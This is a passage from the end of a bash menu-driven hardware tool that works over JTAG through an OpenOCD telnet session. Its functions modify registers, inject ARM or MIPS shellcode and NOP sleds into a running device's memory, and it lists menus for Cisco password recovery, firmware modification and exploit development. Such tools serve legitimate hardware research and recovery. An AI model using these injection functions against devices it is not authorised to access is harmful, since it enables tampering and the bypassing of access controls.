            if [ "$confirm" = "yes" ]; then
                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "reg sp $sp_value"
                    sleep 1
                    echo "resume"
                    sleep 1
                    echo "exit"
                } | telnet localhost 4444 2>&1

                log_message "WARNING" "SP modified: SP = $sp_value"
            fi
            ;;
    esac

    read -r -p "Press Enter to continue..."
}

live_code_injection() {
    print_header
    echo "=== Runtime Code Injection ==="
    echo
    echo "Inject and execute code while device is running"
    echo "WARNING: Experimental feature - can crash the device!"
    echo

    echo "  1) Inject ARM shellcode"
    echo "  2) Inject MIPS shellcode"
    echo "  3) Inject from file"
    echo "  4) Inject NOP sled"
    echo "  b) Back"
    echo
    read -r -p "Choose operation: " inj_choice

    case "$inj_choice" in
        1|2)
            local arch="ARM"
            [ "$inj_choice" = "2" ] && arch="MIPS"

            echo
            echo "--- Inject $arch Shellcode ---"
            read -r -p "Enter injection address (hex): " inj_addr
            read -r -p "Enter shellcode in hex (e.g., 01020304...): " shellcode_hex

            # Convert hex to binary
            local shellcode_file="${SESSION_DIR}/injected_code_$(date +%s).bin"
            echo "$shellcode_hex" | xxd -r -p > "$shellcode_file"

            echo
            read -r -p "Inject shellcode at $inj_addr? (yes/no): " confirm

            if [ "$confirm" = "yes" ]; then
                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "load_image \"$shellcode_file\" $inj_addr"
                    sleep 2
                    echo "resume"
                    sleep 1
                    echo "exit"
                } | telnet localhost 4444 2>&1

                log_message "CRITICAL" "Code injected at $inj_addr"
            fi
            ;;
        3)
            echo
            echo "--- Inject from File ---"
            read -r -p "Enter file path: " code_file
            read -r -p "Enter injection address (hex): " inj_addr

            if [ ! -f "$code_file" ]; then
                echo "ERROR: File not found"
            else
                echo
                read -r -p "Inject $(basename "$code_file") at $inj_addr? (yes/no): " confirm

                if [ "$confirm" = "yes" ]; then
                    {
                        sleep 1
                        echo "halt"
                        sleep 1
                        echo "load_image \"$code_file\" $inj_addr"
                        sleep 2
                        echo "resume"
                        sleep 1
                        echo "exit"
                    } | telnet localhost 4444 2>&1

                    log_message "CRITICAL" "Code file injected: $code_file at $inj_addr"
                fi
            fi
            ;;
        4)
            echo
            echo "--- Inject NOP Sled ---"
            read -r -p "Enter start address (hex): " nop_addr
            read -r -p "Enter NOP count: " nop_count
            read -r -p "NOP opcode (0x90 for x86, 0x00 for ARM, 0x00000000 for MIPS): " nop_opcode

            echo
            read -r -p "Inject $nop_count NOPs at $nop_addr? (yes/no): " confirm

            if [ "$confirm" = "yes" ]; then
                local nop_file="${SESSION_DIR}/nop_sled_$(date +%s).bin"
                for ((i=0; i<nop_count; i++)); do
                    echo -n "$nop_opcode" | xxd -r -p >> "$nop_file"
                done

                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "load_image \"$nop_file\" $nop_addr"
                    sleep 2
                    echo "resume"
                    sleep 1
                    echo "exit"
                } | telnet localhost 4444 2>&1

                log_message "WARNING" "NOP sled injected at $nop_addr ($nop_count NOPs)"
            fi
            ;;
    esac

    read -r -p "Press Enter to continue..."
}

menu_live_memory_manipulation() {
    while true; do
        print_header
        echo "--- Live Memory Manipulation During Boot ---"
        echo
        echo "  1) Memory Poke/Peek"
        echo "     (Read/write memory via JTAG)"
        echo
        echo "  2) Register Manipulation"
        echo "     (Read/modify CPU registers)"
        echo
        echo "  3) Runtime Code Injection"
        echo "     (Inject shellcode while running)"
        echo
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) live_memory_poke_peek ;;
            2) live_register_manipulation ;;
            3) live_code_injection ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# --- End Live Memory Manipulation During Boot ---

menu_set_architecture() {
    while true; do
        print_header
        echo "--- Set Target Architecture ---"
        echo "  Current Architecture: $TARGET_ARCH"
        echo
        echo "  1) Set to ARM"
        echo "  2) Set to MIPS"
        echo "  b) Back"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) TARGET_ARCH="arm" ;;
            2) TARGET_ARCH="mips" ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

menu_platform_jtag_config() {
    while true; do
        print_header
        echo "--- Platform and JTAG Configuration ---"
        echo "  Current Platform: $PLATFORM"
        echo "  Current JTAG Adapter: $JTAG_ADAPTER"
        echo "  Current Architecture: $TARGET_ARCH"
        echo
        echo "  1) Detect Platform"
        echo "  2) Detect JTAG Adapter"
        echo "  3) Set Target Architecture"
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) detect_platform ;;
            2) detect_jtag_adapter ;;
            3) menu_set_architecture ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# Main menu for the TUI
main_menu() {
    while true; do
        print_header
        echo -e "${COLOR_CYAN}${COLOR_BOLD}--- Main Menu ---${COLOR_RESET}"
        echo
        echo -e "${COLOR_BOLD}Core Features:${COLOR_RESET}"
        echo "  1) Platform and JTAG Configuration"
        echo "  2) Cisco Password Recovery"
        echo "  3) JTAG Exploitation"
        echo "  4) JTAG Cable Assisted Recovery"
        echo
        echo -e "${COLOR_BOLD}Firmware Tools:${COLOR_RESET}"
        echo "  5) Firmware Modification Workshop"
        echo "  6) Advanced Firmware Analysis Suite"
        echo "  7) Bootloader Development Kit"
        echo "  8) Firmware Filesystem Tools"
        echo
        echo -e "${COLOR_BOLD}Exploitation & Analysis:${COLOR_RESET}"
        echo "  9) Automated Exploit Development Tools"
        echo " 10) Live Memory Manipulation During Boot"
        echo " 11) Memory Analysis"
        echo " 12) Firmware Manipulation"
        echo
        echo -e "${COLOR_BOLD}Utilities:${COLOR_RESET}"
        echo " 13) Configuration Management System"
        echo -e " 14) ${COLOR_GREEN}Recent Files${COLOR_RESET}"
        echo -e " 15) ${COLOR_GREEN}Device Address Presets${COLOR_RESET}"
        echo -e " 16) ${COLOR_YELLOW}Check Dependencies${COLOR_RESET}"
        echo
        echo "  b) Exit"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) menu_platform_jtag_config ;;
            2) menu_password_recovery ;;
            3) menu_jtag_exploitation ;;
            4) menu_jtag_cable_recovery ;;
            5) menu_firmware_workshop ;;
            6) menu_firmware_analysis_suite ;;
            7) menu_bootloader_devkit ;;
            8) menu_firmware_filesystem_tools ;;
            9) menu_exploit_dev_tools ;;
            10) menu_live_memory_manipulation ;;
            11) menu_memory_analysis ;;
            12) menu_firmware_manipulation ;;
            13) menu_config_management ;;
            14) show_recent_files ;;
            15) show_address_presets ;;
            16) check_dependencies ;;
            b) break ;;
            *) echo "Invalid option. Please try again." && sleep 1 ;;
        esac
    done
}

# --- Main Execution ---

# Entry point of the script
main() {
    # Create log file if it doesn't exist
    touch "$LOG_FILE" || { echo "ERROR: Cannot create log file at $LOG_FILE. Exiting."; exit 1; }
    log_message "INFO" "Script started."

    # Create session directory
    SESSION_DIR=$(mktemp -d)
    log_message "INFO" "Session directory created at $SESSION_DIR."

    load_config

    # Check dependencies on first run
    check_dependencies

    main_menu
}

# Call the main function with all script arguments
main "$@"
